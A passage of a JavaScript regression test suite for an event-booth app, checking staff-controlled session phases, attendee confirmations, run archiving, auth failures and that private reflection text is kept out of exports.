    attendeeId: "heaven-blue-a",
    action: "description_yes",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-b",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);

  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.body.phase, "drawing");
  assert.equal(res.body.runId, session1Run1Id);
  assert.deepEqual(res.body.participant.confirmations, {
    drawing_complete: true,
    description_yes: true,
    size_yes: false,
    impact_yes: false,
    programs_done: false,
  });
  assert.equal(res.body.participant.confirmedAt.drawing_complete, firstDrawingConfirmedAt);

  res = await request(port, "heavenDashboardData", { organizerKey });
  let heavenSession1 = sessionSummary(res.body, 1);
  assert.equal(heavenSession1.participantCount, 2);
  assert.equal(heavenSession1.confirmationCounts.drawing_complete, 2);
  assert.equal(heavenSession1.confirmationCounts.description_yes, 1);
  assert.deepEqual(
    heavenSession1.participants.map((participant) => [participant.name, participant.completedActionCount]),
    [["Blue Artist", 2], ["Blue Dreamer", 1]]
  );

  // Each staff transition opens its matching gate. Earlier confirmations
  // remain restorable, while later confirmations are still closed until the
  // leader reaches their minimum phase.
  res = await advance(1, "show_verse", 1);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "verse");
  assert.equal(res.body.state.version, 2);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "description_yes",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-b",
    action: "impact_yes",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_CONFIRMATION_CLOSED");
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "size_yes",
  });
  assert.equal(res.status, 200);

  res = await advance(1, "show_comparison", 2);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "comparison");
  assert.equal(res.body.state.version, 3);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "impact_yes",
  });
  assert.equal(res.status, 200);

  res = await advance(1, "show_impact", 3);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "reflection");
  assert.equal(res.body.state.version, 4);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "programs_done",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_CONFIRMATION_CLOSED");

  res = await advance(1, "show_programs", 4);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "programs");
  assert.equal(res.body.state.version, 5);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "programs_done",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.participant.completedAt, res.body.confirmedAt);

  res = await advance(1, "finish", 5);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "complete");
  assert.equal(res.body.state.version, 6);
  assertIsoTimestamp(res.body.state.completedAt, "Draw Heaven run completion");
  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.body.phase, "complete");
  assert.equal(res.body.participant.confirmations.programs_done, true);
  assert.equal(res.body.participant.confirmations.description_yes, true);

  // A late attendee is not stranded when the speaker has moved ahead. They
  // can catch up from the earliest missing response in prerequisite order,
  // even after the global screen reaches complete.
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-b",
    action: "programs_done",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_CONFIRMATION_PREREQUISITE");
  for (const action of ["description_yes", "size_yes", "impact_yes", "programs_done"]) {
    res = await request(port, "confirmHeavenStep", {
      attendeeId: "heaven-blue-b",
      action,
    });
    assert.equal(res.status, 200, action);
    assert.equal(res.body.idempotent, false, action);
    assert.equal(res.body.state.phase, "complete", action);
  }
  assert.equal(
    Object.values(res.body.state.participant.confirmations).every(Boolean),
    true
  );
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-b",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.state.phase, "complete");

  // Starting another run archives the completed run instead of deleting it.
  // The new active run is clean, has a new identity, and allows the same phone
  // to confirm its steps again without colliding with old idempotency records.
  res = await request(port, "resetHeavenSession", { sessionNumber: 1, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 2);
  assert.equal(res.body.state.version, 7);
  assert.notEqual(res.body.state.runId, session1Run1Id);
  assert.equal(res.body.participantCount, 0);
  assert.equal(res.body.archivedRuns.length, 1);
  const archivedHeavenRun1 = res.body.archivedRuns[0];
  assert.equal(archivedHeavenRun1.runId, session1Run1Id);
  assert.equal(archivedHeavenRun1.runNumber, 1);
  assert.equal(archivedHeavenRun1.phase, "complete");
  assert.equal(archivedHeavenRun1.participantCount, 2);
  assert.equal(archivedHeavenRun1.confirmationCounts.drawing_complete, 2);
  assert.equal(archivedHeavenRun1.confirmationCounts.programs_done, 2);
  assert.deepEqual(
    archivedHeavenRun1.participants.map((participant) => [participant.name, participant.done]),
    [["Blue Artist", true], ["Blue Dreamer", true]]
  );
  const session1Run2Id = res.body.state.runId;
  assert.equal(res.body.participants.every((participant) => (
    confirmationActions.every((action) => participant.confirmations[action] === false)
  )), true);

  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.body.runId, session1Run2Id);
  assert.equal(res.body.runNumber, 2);
  assert.deepEqual(res.body.participant.confirmations, emptyConfirmations);
  res = await advance(1, "start", 7);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.runId, session1Run2Id);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-blue-a",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.notEqual(res.body.confirmedAt, firstDrawingConfirmedAt);

  // Reset also archives an incomplete rehearsal. Run 1 remains intact beside
  // run 2, and the newest active state advances to run 3 without old answers.
  res = await request(port, "resetHeavenSession", { sessionNumber: 1, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 3);
  assert.equal(res.body.state.version, 9);
  assert.equal(res.body.archivedRuns.length, 2);
  assert.deepEqual(res.body.archivedRuns.map((run) => [run.runNumber, run.phase]), [
    [2, "drawing"],
    [1, "complete"],
  ]);
  assert.equal(res.body.archivedRuns[0].participantCount, 1);
  assert.equal(res.body.archivedRuns[0].confirmationCounts.drawing_complete, 1);
  assert.equal(res.body.archivedRuns[1].runId, session1Run1Id);

  // Session 2 is still an untouched run 1. Moving the shared clock changes the
  // eligible wristband group without changing Session 1 active/history data.
  res = await request(port, "setDemoClock", {
    mode: "session2",
    targetIso: "2026-07-18T20:35:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "heavenState", { attendeeId: "heaven-red-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 2);
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.runNumber, 1);
  res = await request(port, "heavenState", { attendeeId: "heaven-blue-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "HEAVEN_NOT_ASSIGNED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 200);
  res = await request(port, "confirmHeavenStep", {
    attendeeId: "heaven-red-a",
    action: "drawing_complete",
  });
  assert.equal(res.status, 200);

  res = await request(port, "heavenDashboardData", { organizerKey });
  heavenSession1 = sessionSummary(res.body, 1);
  const heavenSession2 = sessionSummary(res.body, 2);
  assert.equal(heavenSession1.state.runNumber, 3);
  assert.equal(heavenSession1.archivedRuns.length, 2);
  assert.equal(heavenSession1.participantCount, 0);
  assert.equal(heavenSession2.state.phase, "drawing");
  assert.equal(heavenSession2.participantCount, 1);
  assert.equal(heavenSession2.confirmationCounts.drawing_complete, 1);
  assert.equal(heavenSession2.archivedRuns.length, 0);

  res = await request(port, "setDemoClock", {
    mode: "waiting",
    targetIso: "2026-07-18T20:50:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "heavenState", { attendeeId: "heaven-red-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "HEAVEN_SESSION_CLOSED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");

  // The overall reset is the only destructive reset: it clears active runs,
  // archived runs, and every attendee confirmation across all sessions.
  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "heavenDashboardData", { organizerKey });
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.state.phase,
      session.state.runNumber,
      session.state.version,
      session.participantCount,
      session.archivedRuns.length,
    ]),
    [
      ["welcome", 1, 0, 0, 0],
      ["welcome", 1, 0, 0, 0],
    ]
  );
  const resetDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.deepEqual(resetDb.heavenSessions, {});
  assert.deepEqual(resetDb.heavenConfirmations, []);
  assert.deepEqual(resetDb.heavenRunHistory, []);
}

async function runArtApiRegression(port) {
  const organizerKey = "test-organizer-key";
  const sessionSummary = (dashboard, sessionNumber) => (
    dashboard.sessions.find((session) => session.sessionNumber === sessionNumber)
  );
  const advance = (sessionNumber, action, version, key = organizerKey) => request(
    port,
    "advanceArtSession",
    { sessionNumber, action, version, organizerKey: key }
  );
  const setSessionClock = (sessionNumber) => request(port, "setDemoClock", {
    mode: `session${sessionNumber}`,
    targetIso: [
      "2026-07-18T20:15:00.000Z",
      "2026-07-18T20:35:00.000Z",
    ][sessionNumber - 1],
    organizerKey,
  });
  const transitions = [
    ["start", "definition"],
    ["show_importance", "importance"],
    ["show_purpose_image", "purpose_image"],
    ["ask_heart", "heart_question"],
    ["show_proverbs", "proverbs"],
    ["show_philippians", "philippians"],
    ["start_art", "create"],
    ["show_finished", "finished"],
    ["finish", "complete"],
  ];

  let res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  async function registerArtAttendee(attendeeId, name, wristbandColor) {
    const registration = await request(port, "registerAttendee", { attendeeId, name, organizerKey });
    assert.equal(registration.status, 200);
    const confirmation = await request(port, "confirmWristband", {
      attendeeId, wristbandColor, organizerKey,
    });
    assert.equal(confirmation.status, 200);
    return registration.body;
  }

  await registerArtAttendee("art-orange-a", "Orange Creator", "orange");
  await registerArtAttendee("art-orange-b", "Orange Painter", "orange");
  await registerArtAttendee("art-green-a", "Green Creator", "green");
  await registerArtAttendee("art-red-a", "Red Creator", "red");
  await registerArtAttendee("art-blue-a", "Blue Visitor", "blue");

  // Art Therapy follows the same shared twenty-minute clock as every other
  // booth. Staff can prepare the two rotations at any time, but public
  // attendee state and completion remain closed outside an active session.
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");

  res = await setSessionClock(1);
  assert.equal(res.status, 200);

  // Every staff read/write is protected. All rotations begin as independent
  // run-1 welcome screens mapped from the wristband route configuration.
  res = await request(port, "artDashboardData", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(1, "start", 0, "wrong");
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "resetArtSession", {
    sessionNumber: 1,
    version: 0,
    organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");
  res = await advance(3, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_ART_SESSION");

  res = await request(port, "artDashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessions.length, 2);
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.sessionNumber,
      session.assignedColor.id,
      session.state.phase,
      session.state.runNumber,
      session.state.version,
      session.assignedCount,
      session.participantCount,
      session.completedCount,
      session.archivedRuns.length,
    ]),
    [
      [1, "orange", "welcome", 1, 0, 2, 0, 0, 0],
      [2, "green", "welcome", 1, 0, 1, 0, 0, 0],
    ]
  );
  assert.deepEqual(
    sessionSummary(res.body, 1).participants.map((participant) => [
      participant.name, participant.completedAt,
    ]),
    [["Orange Creator", null], ["Orange Painter", null]]
  );
  res = await request(port, "boothPresentation", { boothId: "art" });
  assert.equal(res.status, 200);
  assert.equal(res.body.status, "waiting");
  assert.equal(res.body.stepIndex, 0);
  assert.equal(res.body.version, 0);
  assert.equal("participants" in res.body, false);

  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 1);
  assert.equal(res.body.assignedColor.id, "orange");
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.runNumber, 1);
  assert.equal(typeof res.body.runId, "string");
  assert.equal(res.body.completedAt, null);
  assert.equal("participants" in res.body, false);
  const session1Run1Id = res.body.runId;

  res = await request(port, "artState", { attendeeId: "art-blue-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "ART_NOT_ASSIGNED");
  res = await request(port, "artState", { attendeeId: "missing-art-attendee" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_NOT_COMPLETE");
  res = await request(port, "boothCheckin", {
    attendeeId: "art-orange-a",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "self",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_NOT_COMPLETE");

  // The leader owns every reveal. Invalid ordering and stale versions cannot
  // skip a slide or advance the room twice from two staff tabs.
  res = await advance(4, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_ART_SESSION");
  res = await advance(1, "not_an_action", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_ART_ACTION");
  res = await advance(1, "show_importance", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "INVALID_ART_TRANSITION");
  res = await advance(1, "start", 99);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CONFLICT");

  let session1Version = 0;
  for (const [action, phase] of transitions) {
    res = await advance(1, action, session1Version);
    assert.equal(res.status, 200, action);
    session1Version += 1;
    assert.equal(res.body.state.phase, phase, action);
    assert.equal(res.body.state.version, session1Version, action);
    assert.equal(res.body.state.runId, session1Run1Id, action);
    assert.equal(res.body.state.runNumber, 1, action);
    if (action === "start") assertIsoTimestamp(res.body.state.startedAt, "Art Therapy run start");
  }
  assert.equal(session1Version, 9);
  assertIsoTimestamp(res.body.state.completedAt, "Art Therapy run completion");
  res = await request(port, "boothPresentation", { boothId: "art" });
  assert.equal(res.status, 200);
  assert.equal(res.body.status, "complete");
  assert.equal(res.body.stepIndex, 7);
  assert.equal(res.body.version, 9);
  assert.match(res.body.message, /Attendees can finish/i);
  res = await advance(1, "finish", 8);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CONFLICT");

  // Refreshing is server-authoritative: the latest leader phase and run are
  // returned without a local, self-paced Art draft.
  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.phase, "complete");
  assert.equal(res.body.version, 9);
  assert.equal(res.body.runId, session1Run1Id);
  assert.equal(res.body.completedAt, null);

  // Completion is immutable per attendee/run, idempotent on refresh, and
  // ignores arbitrary free-text fields supplied by an untrusted client.
  res = await request(port, "completeArt", {
    attendeeId: "art-orange-a",
    reflections: { private: "DO_NOT_EXPORT_ART_REFLECTION" },
    note: "DO_NOT_EXPORT_ART_NOTE",
    comment: "DO_NOT_EXPORT_ART_COMMENT",
    rating: 5,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.equal(res.body.runId, session1Run1Id);
  assert.equal(res.body.runNumber, 1);
  assertIsoTimestamp(res.body.completedAt, "first Art Therapy attendee completion");
  const firstArtCompletionAt = res.body.completedAt;
  const firstArtCheckinId = res.body.checkinId;
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.checkinId, firstArtCheckinId);
  assert.equal(res.body.completedAt, firstArtCompletionAt);
  res = await request(port, "boothCheckin", {
    attendeeId: "art-orange-a",
    boothId: "art",
    boothName: "Art Therapy Table",
    checkedInBy: "self",
    rating: 5,
    note: "DO_NOT_EXPORT_GENERIC_ART_NOTE",
    extraData: { reflections: "DO_NOT_EXPORT_GENERIC_ART_REFLECTION" },
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.checkinId, firstArtCheckinId);
  res = await request(port, "completeArt", { attendeeId: "art-orange-b" });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);

  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.body.completedAt, firstArtCompletionAt);
  res = await request(port, "artDashboardData", { organizerKey });
  let artSession1 = sessionSummary(res.body, 1);
  assert.equal(artSession1.state.phase, "complete");
  assert.equal(artSession1.participantCount, 2);
  assert.equal(artSession1.completedCount, 2);
  assert.equal(artSession1.participants.every((participant) => participant.completedAt), true);

  let artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  const session1CompletionRows = artDb.artCompletions.filter((completion) => (
    completion.sessionNumber === 1 && completion.runId === session1Run1Id
  ));
  assert.equal(session1CompletionRows.length, 2);
  assert.deepEqual(
    Object.keys(session1CompletionRows[0]).sort(),
    ["attendeeId", "completedAt", "id", "runId", "runNumber", "sessionNumber"]
  );
  const completedArtCheckin = artDb.boothCheckins.find((checkin) => (
    checkin.attendeeId === "art-orange-a" && checkin.boothId === "art"
  ));
  assert.ok(completedArtCheckin);
  const privateArtPayload = JSON.stringify(completedArtCheckin);
  [
    "DO_NOT_EXPORT_ART_REFLECTION",
    "DO_NOT_EXPORT_ART_NOTE",
    "DO_NOT_EXPORT_ART_COMMENT",
    "DO_NOT_EXPORT_GENERIC_ART_REFLECTION",
    "DO_NOT_EXPORT_GENERIC_ART_NOTE",
  ].forEach((privateField) => assert.equal(privateArtPayload.includes(privateField), false));
  assert.equal(completedArtCheckin.rating, null);
  assert.equal(completedArtCheckin.note, "");
  ["reflections", "answers", "comment"].forEach((field) => {
    assert.equal(Object.prototype.hasOwnProperty.call(completedArtCheckin.extraData || {}, field), false);
  });
  const artExport = buildExportSnapshot(artDb, {
    generatedAt: "2026-07-18T22:30:00.000Z",
  });
  const exportedArtRows = artExport.tabs.BoothResults.rows.map((row) => (
    Object.fromEntries(artExport.tabs.BoothResults.headers.map((header, index) => [header, row[index]]))
  )).filter((row) => row.boothId === "art");
  assert.equal(exportedArtRows.length, 2);
  const exportedArtPayload = JSON.stringify(exportedArtRows);
  assert.equal(exportedArtPayload.includes("DO_NOT_EXPORT_ART"), false);
  assert.equal(exportedArtPayload.includes("reflections"), false);

  // Invalid duplicate attendee/booth rows from an older identity merge are
  // collapsed on read and stay collapsed after the next durable Art write.
  const duplicateArtCheckin = {
    ...completedArtCheckin,
    id: "legacy-duplicate-art-checkin",
    checkedInAt: "2026-07-18T20:19:59.000Z",
    checkedInBy: "legacy-generic",
    extraData: {
      ...(completedArtCheckin.extraData || {}),
      reflections: "DO_NOT_KEEP_DUPLICATE_ART_DATA",
    },
  };
  artDb.boothCheckins.push(duplicateArtCheckin);
  fs.writeFileSync(testDb, JSON.stringify(artDb, null, 2));
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  const dedupedArtCheckins = artDb.boothCheckins.filter((checkin) => (
    checkin.attendeeId === "art-orange-a" && checkin.boothId === "art"
  ));
  assert.equal(dedupedArtCheckins.length, 1);
  assert.equal(JSON.stringify(dedupedArtCheckins).includes("DO_NOT_KEEP_DUPLICATE_ART_DATA"), false);

  // Session 2 has its own clock assignment and state. Moving the clock does
  // not alter Session 1's completed run or history.
  res = await setSessionClock(2);
  assert.equal(res.status, 200);
  res = await request(port, "artState", { attendeeId: "art-green-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 2);
  assert.equal(res.body.assignedColor.id, "green");
  assert.equal(res.body.phase, "welcome");
  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "ART_NOT_ASSIGNED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "definition");
  res = await request(port, "artDashboardData", { organizerKey });
  assert.equal(sessionSummary(res.body, 1).state.phase, "complete");
  assert.equal(sessionSummary(res.body, 1).completedCount, 2);
  assert.equal(sessionSummary(res.body, 2).state.phase, "definition");
  assert.equal(sessionSummary(res.body, 2).completedCount, 0);

  // Restart preserves a read-only snapshot of the completed run. The active
  // run gets a new identity, while stale reset versions cannot replace it.
  res = await request(port, "resetArtSession", {
    sessionNumber: 1,
    version: 8,
    organizerKey,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CONFLICT");
  res = await request(port, "resetArtSession", {
    sessionNumber: 1,
    version: 9,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 2);
  assert.equal(res.body.state.version, 10);
  assert.notEqual(res.body.state.runId, session1Run1Id);
  assert.equal(res.body.participantCount, 0);
  assert.equal(res.body.completedCount, 0);
  assert.equal(res.body.participants.length, 2);
  assert.equal(res.body.participants.every((participant) => participant.completedAt === null), true);
  assert.equal(res.body.archivedRuns.length, 1);
  assert.equal(res.body.archivedRuns[0].runId, session1Run1Id);
  assert.equal(res.body.archivedRuns[0].runNumber, 1);
  assert.equal(res.body.archivedRuns[0].phase, "complete");
  assert.equal(res.body.archivedRuns[0].participantCount, 2);
  assert.equal(res.body.archivedRuns[0].completedCount, 2);
  assert.deepEqual(
    res.body.archivedRuns[0].participants.map((participant) => participant.name),
    ["Orange Creator", "Orange Painter"]
  );
  const session1Run2Id = res.body.state.runId;

  // The same attendee can complete a later run. Each run keeps its own visit
  // row so archived booth results cannot be overwritten by a restart.
  res = await setSessionClock(1);
  assert.equal(res.status, 200);
  let session1Run2Version = 10;
  for (const [action, phase] of transitions) {
    res = await advance(1, action, session1Run2Version);
    assert.equal(res.status, 200, `run 2 ${action}`);
    session1Run2Version += 1;
    assert.equal(res.body.state.phase, phase, `run 2 ${action}`);
  }
  assert.equal(session1Run2Version, 19);
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.equal(res.body.runId, session1Run2Id);
  assert.notEqual(res.body.checkinId, firstArtCheckinId);

  res = await request(port, "artDashboardData", { organizerKey });
  artSession1 = sessionSummary(res.body, 1);
  assert.equal(artSession1.completedCount, 1);
  assert.equal(artSession1.archivedRuns.length, 1);
  assert.equal(artSession1.archivedRuns[0].runId, session1Run1Id);
  assert.equal(artSession1.archivedRuns[0].completedCount, 2);
  assert.deepEqual(
    artSession1.archivedRuns[0].participants.map((participant) => participant.name),
    ["Orange Creator", "Orange Painter"]
  );
  artDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(artDb.artCompletions.filter((row) => row.attendeeId === "art-orange-a").length, 2);

  // A later incomplete rehearsal is archived too. Histories stay newest-first
  // and retain both earlier completion snapshots without leaking run state.
  res = await request(port, "resetArtSession", {
    sessionNumber: 1,
    version: 19,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.runNumber, 3);
  assert.equal(res.body.state.version, 20);
  const session1Run3Id = res.body.state.runId;
  res = await advance(1, "start", 20);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "definition");
  res = await request(port, "resetArtSession", {
    sessionNumber: 1,
    version: 21,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.runNumber, 4);
  assert.equal(res.body.state.version, 22);
  assert.deepEqual(
    res.body.archivedRuns.map((run) => [run.runNumber, run.phase, run.completedCount]),
    [[3, "definition", 0], [2, "complete", 1], [1, "complete", 2]]
  );
  assert.equal(res.body.archivedRuns[0].runId, session1Run3Id);
  assert.equal(res.body.archivedRuns[1].runId, session1Run2Id);
  assert.equal(res.body.archivedRuns[2].runId, session1Run1Id);

  // The public APIs close as soon as booths end at 3:50, while protected staff history
  // remains available until the overall organizer performs a destructive reset.
  res = await request(port, "setDemoClock", {
    mode: "waiting",
    targetIso: "2026-07-18T20:50:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");
  res = await request(port, "setDemoClock", {
    mode: "ended",
    targetIso: "2026-07-18T21:00:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "artState", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");
  res = await request(port, "completeArt", { attendeeId: "art-orange-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "ART_SESSION_CLOSED");
  res = await request(port, "artDashboardData", { organizerKey });
  assert.equal(sessionSummary(res.body, 1).archivedRuns.length, 3);
  assert.equal(sessionSummary(res.body, 2).state.phase, "definition");

  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "artDashboardData", { organizerKey });
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.state.phase,
      session.state.runNumber,
      session.state.version,
      session.completedCount,
      session.archivedRuns.length,
    ]),
    [
      ["welcome", 1, 0, 0, 0],
      ["welcome", 1, 0, 0, 0],
    ]
  );
  const resetDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.deepEqual(resetDb.artSessions, {});
  assert.deepEqual(resetDb.artCompletions, []);
  assert.deepEqual(resetDb.artRunHistory, []);
  assert.deepEqual(resetDb.boothCheckins, []);
}

async function runNewSongApiRegression(port) {
  const organizerKey = "test-organizer-key";
  const sessionSummary = (dashboard, sessionNumber) => (
    dashboard.sessions.find((session) => session.sessionNumber === sessionNumber)
  );
  const advance = (sessionNumber, action, version, key = organizerKey) => request(
    port,
    "advanceNewSongSession",
    { sessionNumber, action, version, organizerKey: key }
  );
  const setSessionClock = (sessionNumber) => request(port, "setDemoClock", {
    mode: `session${sessionNumber}`,
    targetIso: [
      "2026-07-18T20:15:00.000Z",
      "2026-07-18T20:35:00.000Z",
    ][sessionNumber - 1],
    organizerKey,
  });
  const voteCount = (summary, title) => (
    summary.voteCounts.find((entry) => entry.title === title).votes
  );

  let res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  async function registerNewSongAttendee(attendeeId, name, wristbandColor) {
    const registration = await request(port, "registerAttendee", { attendeeId, name, organizerKey });
    assert.equal(registration.status, 200);
    const confirmation = await request(port, "confirmWristband", {
      attendeeId, wristbandColor, organizerKey,
    });
    assert.equal(confirmation.status, 200);
    return registration.body;
  }

  await registerNewSongAttendee("song-green-a", "Green Singer", "green");
  await registerNewSongAttendee("song-green-b", "Green Listener", "green");
  await registerNewSongAttendee("song-green-c", "Green Worshipper", "green");
  await registerNewSongAttendee("song-yellow-a", "Yellow Singer", "yellow");
  await registerNewSongAttendee("song-yellow-b", "Yellow Listener", "yellow");
  await registerNewSongAttendee("song-orange-a", "Orange Singer", "orange");
  await registerNewSongAttendee("song-blue-a", "Blue Visitor", "blue");

  // Attendee state follows the shared event window. Staff can prepare all
  // two rotations, but attendee data is unavailable before or after them.
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");

  res = await setSessionClock(1);
  assert.equal(res.status, 200);

  // Every staff action is protected. The dashboard exposes exactly two
  // isolated rotations, their timed wristband groups, and the canonical poll.
  res = await request(port, "newSongDashboardData", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(1, "start", 0, "wrong");
  assert.equal(res.status, 401);
